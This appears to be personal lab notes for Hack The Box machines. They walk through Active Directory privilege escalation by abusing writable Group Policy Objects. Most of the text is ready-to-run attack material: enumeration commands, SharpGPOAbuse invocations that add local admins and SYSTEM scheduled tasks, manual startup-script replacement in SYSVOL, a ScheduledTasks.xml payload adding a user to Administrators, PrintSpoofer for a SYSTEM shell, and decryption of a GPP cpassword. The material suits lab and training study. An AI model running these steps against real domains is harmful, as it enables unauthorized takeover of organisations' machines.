## Prerequisites
- Non-admin user on domain-joined machine
- PowerView or built-in PowerShell cmdlets
- Access to SYSVOL share
- SharpGPOAbuse compiled (optional but recommended)

---

## Step 1: Enumerate GPOs Your User Can Modify

### Using PowerView

```powershell
# Convert your username to SID
$sid = Convert-NameToSid "DOMAIN\username"

# Find GPOs you have write access to
Get-DomainGPO | Get-ObjectAcl | Where-Object {$_.SecurityIdentifier -eq $sid}
```

### Using Built-in PowerShell

```powershell
# List all GPOs
Get-GPO -All | Select DisplayName

# Check SYSVOL permissions (you need write access here)
icacls \\DC\sysvol\
```

### What You're Looking For

- **CreateChild, WriteProperty, or GenericAll** permissions on a GPO
- GPOs linked to OUs containing your target machines
- Often GPOs named like "Security Group Policy" or similar

---

## Step 2: Check Which Machines the GPO Targets

```powershell
# Find where a specific GPO is linked
Get-GPInheritance -Target "ou=IT,dc=domain,dc=local" | Select-Object Name, LinkedGroupPolicyObjects

# Or check directly
$gpo = Get-GPO -Name "Target-GPO-Name"
Get-GPOReport -Guid $gpo.Id -ReportType Xml
```

**Key**: The GPO must be linked to an OU where your target machine's computer account resides.

---

## Step 3: Check SYSVOL Script Locations (Alternative Method)

Look for GPO scripts you can write to:

```powershell
# Browse SYSVOL for scripts
dir \\DC\sysvol\domain\Policies\

# Check if you have write access to script folders
icacls "\\DC\sysvol\domain\Policies\{GPO-GUID}\Machine\Scripts"
```

If writable, you can replace or create:

- `shutdown.bat`
- Startup scripts
- Logon scripts

---

## Step 4: Exploit via SharpGPOAbuse (Easiest)

### Check Permissions First

```powershell
SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Target-GPO" --UserAccount domain\username
```

### Common Exploit Options

```powershell
# Add yourself as local admin on machines with this GPO applied
SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Vulnerable-GPO" --UserAccount "DOMAIN\attacker"

# Add a new local admin user
SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Vulnerable-GPO" --UserAccount "DOMAIN\newadmin"

# Add privilege (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.)
SharpGPOAbuse.exe --AddPrivilege --GPOName "Vulnerable-GPO" --UserAccount "DOMAIN\username" --Privilege "SeTakeOwnershipPrivilege"

# Create a scheduled task for immediate execution
SharpGPOAbuse.exe --AddTask --GPOName "Vulnerable-GPO" --TaskName "System Update" --Author "Microsoft" --Command "cmd.exe /c whoami > C:\temp\output.txt"
```

---

## Step 5: Manual Exploitation (If SharpGPOAbuse Doesn't Work)

### Option A: Replace Startup Script

**1. Identify the GPO GUID and script location:**

```powershell
Get-GPO -Name "Vulnerable-GPO" | Select Id
# Get GUID like: 3f645683-fc6b-4ef1-a33e-3707a3a46b81
```

**2. Navigate to script location:**

```powershell
\\DC\sysvol\domain\Policies\{3f645683-fc6b-4ef1-a33e-3707a3a46b81}\Machine\Scripts\Startup
```

**3. Create or replace startup script:**

```powershell
# Copy your payload here
# Rename it to match existing scripts or modify scripts.ini
```

**4. Trigger GPO refresh:**

```powershell
# On target machine, force GPO update (runs as SYSTEM)
gpupdate /force

# Or wait for next logon/startup (policies apply as SYSTEM/machine context)
```

### Option B: Modify GPO Scheduled Task via SYSVOL XML

**1. Find and edit ScheduledTasks.xml:**

```powershell
\\DC\sysvol\domain\Policies\{GPO-GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
```

**2. Add a new task:**

```xml
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <Task clsid="{D6EFB589-F92E-47f7-BFCD-CABF161171F7}" name="Elevate" image="0" changed="2024-01-01 00:00:00" uid="{11111111-1111-1111-1111-111111111111}">
        <Properties action="C" name="Elevate" runAs="NT AUTHORITY\SYSTEM" logonType="Password">
            <Task version="1.3" xmlns="">
                <Triggers>
                    <LogonTrigger/>
                </Triggers>
                <Actions>
                    <Exec>
                        <Command>cmd.exe</Command>
                        <Arguments>/c net localgroup administrators domain\username /add</Arguments>
                    </Exec>
                </Actions>
            </Task>
        </Properties>
    </Task>
</ScheduledTasks>
```

---

## Step 6: Trigger GPO Application

On the **target machine** (not necessarily as admin):

```powershell
# Force immediate GPO refresh
gpupdate /force

# Check if task was created
schtasks /query /v

# Monitor event logs
Get-EventLog -LogName "Group Policy" -Newest 10
```

**Important**: Scripts run in **SYSTEM context** when applied at machine startup/logon, so you'll get SYSTEM privileges.

---

## Step 7: Verify Exploitation

```powershell
# Check if you're now local admin
net localgroup administrators

# Or check if scheduled task ran
Get-ScheduledTask | Where-Object {$_.TaskName -like "*Elevate*"}

# Get SYSTEM shell (if you have SeImpersonate/SeDebugPrivilege)
PrintSpoofer.exe -i -c cmd.exe
```

---

## Tips for HTB Machines

1. **Check `Miscellaneous Misconfigurations.md`** in your notes - it has specific commands
2. **Look for writable SYSVOL paths** - `icacls` is your friend
3. **Default Domain Policy** - check if you can modify it
4. **Group Policy Preference (GPP) passwords** - if you find old `.xml` files with `cpassword`, decrypt them:
    
    ```powershell
    # Run on kali or linuxgpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
    ```
    
5. **Force GPO refresh** - `gpupdate /force` is key to getting your changes to apply
6. **Machine vs User context** - machine startup scripts run as SYSTEM (best for privesc)

---

## Tools Reference

- **SharpGPOAbuse** - Automated exploitation
- **PowerView** - Enumeration
- **gpp-decrypt** - Decrypt legacy GPP passwords
- **PingCastle/BloodHound** - Find vulnerable GPOs automatically
